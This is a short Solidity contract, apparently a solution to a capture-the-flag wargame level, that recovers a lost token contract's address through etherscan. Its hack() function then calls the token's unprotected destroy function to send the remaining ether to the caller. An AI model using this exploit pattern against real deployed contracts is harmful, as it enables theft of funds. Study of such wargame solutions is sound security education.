// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/Recovery.sol';

contract HackRecovery {
    // Blockchain it's public and traceable
    // So, you can get the address of the contract Recovery in the console.
    // After that you go to etherscan and search a contract creation between the internal tx.
    // Bingo, now you have the forgotten address of the contract SimpleToken.
    SimpleToken public originalContract = SimpleToken(payable(0x1f20896cD386aF7d152503cD9aC69Fa28c51f6dD));

    function hack() public {
        // The only thing you need to do is to call the function destroy passing your address as a parameter.
        // This way the remaining ether in the contract it's going to be send to you.
        originalContract.destroy(payable(tx.origin));
    }

}